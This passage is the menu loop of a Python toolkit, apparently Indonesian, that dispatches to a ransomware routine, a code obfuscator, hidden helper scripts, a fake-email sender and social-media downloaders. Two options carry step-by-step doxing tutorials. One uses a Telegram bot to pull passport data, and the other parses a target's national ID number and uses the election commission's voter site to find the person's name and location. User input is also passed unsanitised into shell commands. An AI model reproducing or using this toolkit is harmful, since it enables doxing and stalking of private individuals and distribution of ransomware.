                os.system(f"curl http://wttr.in/{kota}")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "27":
                sleep(1)
                ransomware()
                wait = input("\n \033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "28":
                sleep(1)
                #os.system("python3.11 .data/.d")
                file = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mFile \033[1;31m(/sdcard/folder/file.py) \033[1;36m: \033[0;37m")
                lapisan = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mLapisan \033[1;31m(ex.100) \033[1;36m: \033[0;37m")
                output = file.lower().replace('.py', '') + '_enc.py'
                os.system(f"python3.11 .data/.j -i {file} -o {output} -s 100")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "29":
                print(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;36mPlease wait...")
                os.system("python3.11 .data/.r")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "30":
                sleep(1)
                print("\033[1;31mTutorial:")
                print("1. Masuk telegram & klik start")
                print("2. Isi nomor dengan format 628xxxx lalu kirim")
                print("3. Jika berbayar, gunakan akun telegram lain")
                print("4. Klik paspor nya dan paste pada menu NIK Checker")
                sleep(1)
                if os.name == "posix":
                    os.system("xdg-open https://t.me/DoxArt_Bot")
                elif os.name == "nt":
                    os.system("start https://t.me/DoxArt_Bot")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "31":
                sleep(1)
                nik = input("\n\033[0mMasukkan NIK: \033[0;32m")
                print("\033[0m")
                os.system(f"nik-parse -n {nik}")
                cari = input("\n\033[0mLanjut cek nama dan lokasi NIK? (y/n): \033[0;32m")
                if cari == 'y':
                    if os.name == "posix":
                        os.system("xdg-open https://cekdptonline.kpu.go.id/")
                    elif os.name == "nt":
                        os.system("start https://cekdptonline.kpu.go.id/")
                    print("\n\033[0mTutorial:")
                    print("1. Masuk browser")
                    print("2. Isi NIK target lalu klik tombol (langkah 2)")
                    print("3. Isi nomor WhatsApp anda untuk menerima OTP")
                    print("4. Masukkan OTP yg dikirimkan ke WhatsApp anda")
                    print("5. Selesai. Utk melihat lokasi, klik icon KPU pada peta")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "32":
                sleep(1)
                tts()
                wait = input("\n \033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "33":
                sleep(1)
                fake_email()
                wait = input(" \033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "63855736":
                sleep(1)
                tiktok_downloader()
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "62857552":
                sleep(1)
                ig_downloader()
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "52726578":
                sleep(1)
                fb_downloader()
                wait = input("\n \033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "53837546":
                sleep(1)
                yt_downloader()
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "34":
                os.system("cd .data && python3.11 .k && cd ..")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "35":
                sleep(1)
                bot_wa_ai()
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "36":
                sleep(1)
                os.system("cls" if os.name == "nt" else "clear")
                print("\033[0m")
                os.system("cat dark-x.txt")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "LOGIN" or message == "login" or message == "Login":
                os.system("login")
            else:
                print("\033[1;31mInvalid options...!!!")
                sleep(1)
                os.system("cls" if os.name == "nt" else "clear")
                logo()
    except KeyboardInterrupt:
        print(" \033[1;31m[\033[1;37m!\033[1;31m] \033[1;33mProgram dihentikan")
        print()
        break
